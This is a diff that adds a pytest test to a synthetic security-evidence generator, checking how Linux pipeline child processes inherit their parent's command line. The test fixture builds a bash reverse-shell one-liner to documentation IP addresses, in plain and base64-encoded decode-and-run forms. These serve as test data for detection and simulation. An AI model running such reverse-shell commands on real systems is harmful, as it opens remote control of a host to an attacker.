@@ -4,13 +4,70 @@ from datetime import UTC, datetime, timedelta
 from types import SimpleNamespace
 from unittest.mock import Mock
 
+import pytest
+
+from evidenceforge.generation.engine.storyline import StorylineMixin
 from evidenceforge.generation.engine.typed_handlers.process_pipeline import (
     emit_storyline_linux_pipeline_children,
     linux_pipeline_parent_termination_time,
+    linux_pipeline_submission_command,
     terminate_storyline_linux_pipeline_children,
 )
 from evidenceforge.generation.timing import TimingRuntime
 from evidenceforge.models.scenario import System, User
+
+
+@pytest.mark.parametrize("destination,port", [("198.51.100.7", 443), ("203.0.113.9", 8443)])
+@pytest.mark.parametrize("encoded", [False, True])
+def test_pipeline_socket_retains_submission_protocol_semantics(
+    destination: str, port: int, encoded: bool
+) -> None:
+    import base64
+
+    payload = f"bash -i >& /dev/tcp/{destination}/{port} 0>&1"
+    command = (
+        f"bash -c 'echo {base64.b64encode(payload.encode()).decode()} | base64 -d | bash'"
+        if encoded
+        else f"bash -c '{payload} | cat'"
+    )
+    system = System(hostname="WEB", ip="10.0.0.1", os="Ubuntu 22.04", type="server")
+    parent = SimpleNamespace(command_line=command)
+    child = SimpleNamespace(
+        parent_pid=100,
+        concurrency_group_id="storyline-linux-pipeline:WEB:100:time:0",
+    )
+    processes = {100: parent, 101: child}
+    runtime = SimpleNamespace(
+        state_manager=SimpleNamespace(get_process=lambda host, pid: processes.get(pid))
+    )
+    submission = linux_pipeline_submission_command(
+        runtime,
+        system=system,
+        pid=101,
+        command_line="bash",  # type: ignore[arg-type]
+    )
+    assert StorylineMixin._command_contains_raw_tcp_endpoint(submission, destination, port)
+    assert not StorylineMixin._command_contains_raw_tcp_endpoint(submission, destination, port + 1)
+    child.concurrency_group_id = "unrelated-pipeline"
+    assert (
+        linux_pipeline_submission_command(
+            runtime,
+            system=system,
+            pid=101,
+            command_line="bash",  # type: ignore[arg-type]
+        )
+        == "bash"
+    )
+    child.concurrency_group_id = "storyline-linux-pipeline:WEB:999:time:0"
+    assert (
+        linux_pipeline_submission_command(
+            runtime,
+            system=system,
+            pid=101,
+            command_line="bash",  # type: ignore[arg-type]
+        )
+        == "bash"
+    )
 
 
 def test_typed_bash_c_pipeline_emits_external_stages_under_authored_shell() -> None:
